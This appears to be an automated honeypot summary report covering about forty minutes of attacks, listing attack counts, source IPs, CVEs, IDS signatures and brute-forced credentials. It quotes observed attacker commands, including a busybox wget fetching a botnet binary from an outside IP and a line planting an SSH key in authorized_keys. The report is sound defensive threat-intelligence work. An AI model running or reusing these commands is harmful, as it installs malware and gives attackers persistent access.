Honeypot Attack Summary Report

Report Generated: 2025-10-13T06:01:24Z
Timeframe: 2025-10-13T05:20:02Z to 2025-10-13T06:00:01Z
Files Used: agg_log_20251013T052002Z.json, agg_log_20251013T054001Z.json, agg_log_20251013T060001Z.json

Executive Summary
This report summarizes 10,222 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie, Suricata, and Ciscoasa honeypots. The most frequent attacks involved attempts to exploit SMB and SSH services, with a significant number of events related to the DoublePulsar backdoor. Top attacking IPs originate from various global locations, and a range of CVEs were targeted.

Detailed Analysis

Attacks by Honeypot:
* Cowrie: 4698
* Suricata: 2386
* Ciscoasa: 1874
* Sentrypeer: 652
* Honeytrap: 299
* Heralding: 97
* Redishoneypot: 46
* Tanner: 43
* Dionaea: 40
* H0neytr4p: 36
* Miniprint: 18
* Mailoney: 12
* Honeyaml: 7
* Ipphoney: 4
* Adbhoney: 3
* ssh-rsa: 2
* Dicompot: 2
* ConPot: 2
* ElasticPot: 1

Top Attacking IPs:
* 203.78.147.68
* 58.181.99.122
* 138.197.43.50
* 212.87.220.20
* 62.141.43.183

Top Targeted Ports/Protocols:
* TCP/445
* 22 (SSH)
* 5060 (SIP)
* socks5/1080
* TCP/22

Most Common CVEs:
* CVE-2020-11910
* CVE-2002-0013
* CVE-2002-0012
* CVE-2021-35394
* CVE-2006-2369

Commands Attempted by Attackers:
* uname -a
* whoami
* cat /proc/cpuinfo | grep name | wc -l
* cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys
* chmod +x setup.sh; sh setup.sh; rm -rf setup.sh
* cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

Signatures Triggered:
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication (2024766)
* ET DROP Dshield Block Listed Source group 1 (2402000)
* ET SCAN NMAP -sS window 1024 (2009582)
* ET SCAN Potential SSH Scan (2001219)
* ET INFO Reserved Internal IP Traffic (2002752)

Users / Login Attempts (user/password):
* root/rootroot
* support/Support1
* test/test88
* blank/0000000000
* unknown/unknown333
* root/calvin
* prueba/prueba
* root/inguyentunam
* test/test

Files Uploaded/Downloaded:
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* boatnet.mpsl
* 11
* fonts.gstatic.com
* css?family=Libre+Franklin...
* ie8.css?ver=1.0
* html5.js?ver=3.7.3

HTTP User-Agents:
* No user agents were recorded in this period.

SSH Clients and Servers:
* No specific SSH clients or servers were identified in this period.

Top Attacker AS Organizations:
* No AS organization data was recorded in this period.

Key Observations and Anomalies
- A high volume of activity related to the DoublePulsar backdoor was observed, primarily from a single IP address (58.181.99.122). This suggests a targeted campaign.
- Attackers attempted to download and execute various ELF binaries (urbotnetisass), indicating attempts to install malware on compromised systems.
- A common tactic observed was the attempt to add the attacker's SSH key to the authorized_keys file, allowing for persistent access.
- A wide variety of usernames and passwords were attempted, indicating brute-force attacks against common services like SSH.
- The targeting of multiple architectures (arm, x86, mips) with the downloaded malware suggests a broad and automated attack campaign.
